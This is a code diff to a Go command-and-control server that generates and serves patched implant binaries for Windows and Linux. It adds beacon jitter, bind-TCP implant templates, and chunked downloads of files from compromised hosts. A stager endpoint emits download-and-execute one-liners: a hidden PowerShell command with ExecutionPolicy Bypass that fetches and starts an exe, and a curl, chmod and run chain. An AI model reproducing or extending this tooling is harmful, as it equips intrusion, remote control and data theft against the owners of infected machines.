@@ -4,7 +4,9 @@ import (
 	"cupcake-server/pkg/globals"
 	"cupcake-server/pkg/hub"
 	"cupcake-server/services"
+	"encoding/base64"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -13,7 +15,19 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
+	"sync"
 )
+
+var StagerCache = sync.Map{}
+
+type StagerConfig struct {
+	OS              string
+	Arch            string
+	ListenerID      string
+	Host            string
+	AutoDestruct    bool
+	SleepTime       int
+}
 
 var upgrader_gen = websocket.Upgrader{
 	CheckOrigin: func(r *http.Request) bool { return true },
@@ -33,6 +47,7 @@ func HandleGenerate(c *gin.Context) {
 		UseUPX          bool   `json:"use_upx"`
 		EncryptionSalt  string `json:"encryption_salt"`
 		ObfuscationMode string `json:"obfuscation_mode"`
+		Jitter          int    `json:"jitter"`
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -51,6 +66,12 @@ func HandleGenerate(c *gin.Context) {
 	req.EncryptionSalt = ln.EncryptionSalt
 	req.ObfuscationMode = ln.ObfuscateMode
 	req.AesKey = ln.EncryptKey
+	if req.Jitter == 0 {
+		req.Jitter = ln.HeartbeatJitter
+	}
+	if req.Jitter == 0 {
+		req.Jitter = 30 // Default 30%
+	}
 
 	// --- [NEW] Method Dispatcher ---
 	
@@ -64,6 +85,8 @@ func HandleGenerate(c *gin.Context) {
 				templateName = "client_template_windows.exe"
 			case "TCP":
 				templateName = "client_template_windows_tcp.exe"
+			case "BIND-TCP", "正向TCP":
+				templateName = "client_template_windows_bind.exe"
 			case "DNS":
 				templateName = "client_template_windows_dns.exe"
 			default:
@@ -75,13 +98,15 @@ func HandleGenerate(c *gin.Context) {
 				templateName = "client_template_linux"
 			case "TCP":
 				templateName = "client_template_linux_tcp"
+			case "BIND-TCP", "正向TCP":
+				templateName = "client_template_linux_bind"
 			case "DNS":
 				templateName = "client_template_linux_dns"
 			default:
 				templateName = "client_template_linux"
 			}
 			if req.Arch == "arm64" {
-				templateName = "client_template_linux_arm64"
+				templateName += "_arm64"
 			}
 		}
 		
@@ -110,7 +135,7 @@ func HandleGenerate(c *gin.Context) {
 			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 		}
 
-		patched, err := services.PatchPayload(raw, c2url, req.AesKey, 10, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
+		patched, err := services.PatchPayload(raw, c2url, req.AesKey, 10, req.Jitter, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": "补丁失败: " + err.Error()})
 			return
@@ -143,6 +168,7 @@ func HandleGenerate(c *gin.Context) {
 		HeartbeatInterval: 30,
 		EncryptionSalt:    req.EncryptionSalt,
 		ObfuscationMode:   req.ObfuscationMode,
+		Jitter:            req.Jitter,
 	}
 
 	go func() {
@@ -208,5 +234,189 @@ func HandleBuildLogsWS(c *gin.Context) {
 func HandleFsDownload(c *gin.Context) {
 	uuid := c.Query("uuid")
 	path := c.Query("path")
-	c.JSON(200, gin.H{"uuid": uuid, "path": path})
+
+	if uuid == "" || path == "" {
+		var req struct {
+			UUID string `json:"uuid"`
+			Path string `json:"path"`
+		}
+		if err := c.ShouldBindJSON(&req); err == nil {
+			if uuid == "" {
+				uuid = req.UUID
+			}
+			if path == "" {
+				path = req.Path
+			}
+		}
+	}
+
+	if uuid == "" || path == "" {
+		c.JSON(400, gin.H{"error": "uuid and path are required"})
+		return
+	}
+
+	filename := filepath.Base(path)
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
+	c.Header("Content-Type", "application/octet-stream")
+	c.Header("Transfer-Encoding", "chunked")
+
+	offset := uint64(0)
+	chunkSize := 2 * 1024 * 1024 // 2MB
+
+	c.Stream(func(w io.Writer) bool {
+		dataBase64, isEOF, err := services.DownloadChunk(uuid, path, offset, chunkSize)
+		if err != nil {
+			return false // Abort stream
+		}
+
+		data, err := base64.StdEncoding.DecodeString(dataBase64)
+		if err == nil && len(data) > 0 {
+			w.Write(data)
+			offset += uint64(len(data))
+		}
+
+		if isEOF || len(data) == 0 {
+			return false // End of file
+		}
+		return true // Request next chunk
+	})
+}
+
+func HandleGetStager(c *gin.Context) {
+	listenerID := c.Query("listener_id")
+	osType := c.Query("os")     // windows, linux
+	arch := c.Query("arch")     // x64, arm64
+	host := c.Query("host")     // C2 public host
+	
+	if listenerID == "" || osType == "" {
+		c.JSON(400, gin.H{"error": "listener_id and os are required"})
+		return
+	}
+
+	id := uuid.New().String()[:8]
+	StagerCache.Store(id, StagerConfig{
+		OS:           osType,
+		Arch:         arch,
+		ListenerID:   listenerID,
+		Host:         host,
+		AutoDestruct: true,
+		SleepTime:    10,
+	})
+
+	serverHost := c.Request.Host
+	protocol := "http"
+	if c.Request.TLS != nil { protocol = "https" }
+	
+	baseURL := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id)
+	
+	command := ""
+	if osType == "windows" {
+		command = fmt.Sprintf("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; `$f='%s.exe'; (New-Object System.Net.WebClient).DownloadFile('%s', `$f); Start-Process `$f;\"", id, baseURL)
+	} else {
+		command = fmt.Sprintf("curl -sL %s -o %s && chmod +x %s && ./%s &", baseURL, id, id, id)
+	}
+
+	c.JSON(200, gin.H{
+		"id":      id,
+		"command": command,
+	})
+}
+
+func HandleServePayload(c *gin.Context) {
+	id := c.Param("id")
+	val, ok := StagerCache.Load(id)
+	if !ok {
+		c.Data(404, "text/plain", []byte("Not found"))
+		return
+	}
+	conf := val.(StagerConfig)
+
+	// Fetch Listener Details
+	lnVal, ok := globals.Listeners.Load(conf.ListenerID)
+	if !ok {
+		c.Data(404, "text/plain", []byte("Listener not found"))
+		return
+	}
+	ln := lnVal.(*globals.Listener)
+
+	// Prepare template name
+	templateName := "client_template_linux"
+	if conf.OS == "windows" {
+		switch strings.ToUpper(ln.Protocol) {
+		case "WS": templateName = "client_template_windows.exe"
+		case "TCP": templateName = "client_template_windows_tcp.exe"
+		case "DNS": templateName = "client_template_windows_dns.exe"
+		default: templateName = "client_template_windows.exe"
+		}
+	} else {
+		switch strings.ToUpper(ln.Protocol) {
+		case "WS": templateName = "client_template_linux"
+		case "TCP": templateName = "client_template_linux_tcp"
+		case "DNS": templateName = "client_template_linux_dns"
+		default: templateName = "client_template_linux"
+		}
+		if conf.Arch == "arm64" {
+			templateName += "_arm64"
+		}
+	}
+
+	templatePath := filepath.Join("assets", templateName)
+	raw, err := os.ReadFile(templatePath)
+	if err != nil {
+		c.Data(500, "text/plain", []byte("Template not found: " + templateName))
+		return
+	}
+
+	host := conf.Host
+	if host == "" {
+		host = strings.Split(c.Request.Host, ":")[0]
+	}
+
+	c2url := ""
+	switch strings.ToUpper(ln.Protocol) {
+	case "WS": c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+	case "TCP": c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+	case "DNS": c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
+	default: c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+	}
+
+	patched, err := services.PatchPayload(raw, c2url, ln.EncryptKey, 10, ln.HeartbeatJitter, "", conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode)
+	if err != nil {
+		c.Data(500, "text/plain", []byte("Patch failed: " + err.Error()))
+		return
+	}
+
+	c.Data(200, "application/octet-stream", patched)
+}
+
+// HandleServeProtectedPayload: 受保护的 Payload 下载接口（替代 Static("/downloads")）
+// 已通过 AuthMiddleware 鉴权，防止目录枚举和路径穿越
+func HandleServeProtectedPayload(c *gin.Context) {
+	filename := c.Param("filename")
+
+	// 🛡️ 路径穿越检查：只允许纯文件名，不允许任何路径分隔符
+	if strings.Contains(filename, "/") || strings.Contains(filename, "\\") ||
+		strings.Contains(filename, "..") || filename == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
+		return
+	}
+
+	// 限定到指定目录
+	fullPath := filepath.Join("storage", "payloads", filename)
+	fullPath = filepath.Clean(fullPath)
+
+	// 二次确认路径在允许范围内
+	baseDir, _ := filepath.Abs(filepath.Join("storage", "payloads"))
+	absPath, _ := filepath.Abs(fullPath)
+	if !strings.HasPrefix(absPath, baseDir) {
+		c.JSON(http.StatusForbidden, gin.H{"error": "Access denied"})
+		return
+	}
+
+	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
+		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
+		return
+	}
+
+	c.FileAttachment(fullPath, filename)
 }
